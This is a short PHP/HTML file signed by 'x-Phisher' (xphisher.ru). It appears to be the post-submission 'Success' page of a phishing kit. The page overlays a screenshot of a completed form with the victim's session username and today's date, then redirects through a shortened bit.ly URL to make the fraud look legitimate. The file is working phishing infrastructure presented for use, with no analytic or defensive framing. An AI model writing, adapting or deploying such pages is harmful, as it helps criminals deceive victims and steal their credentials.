<?php
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.ru ===========================
*/
session_start();
error_reporting(0);
$_SESSION['u'] = $_SESSION['u'];
?>
<!DOCTYPE html>
<html>
<head>
  <title>Success</title>
  <META HTTP-EQUIV="refresh" CONTENT="7; URL=https://bit.ly/NFEleB">
</head>
<body>
<div>
    <div style="position:absolute;left:0px;top:0px;width:1349px;height:614px;z-index:0;">
        <img src="./files/done_form.jpg">
    </div>
    <p style="left:965px;position:absolute;top:55px;font-size:.845em;"> <?php echo $_SESSION['u']; ?></p>
    <p style="left:1065px;position:absolute;top:69px;font-size:.845em;line-height: 1.2em; margin: 0;"><?php echo date("F j, Y") ?></p>
 </div>
</body>
</html>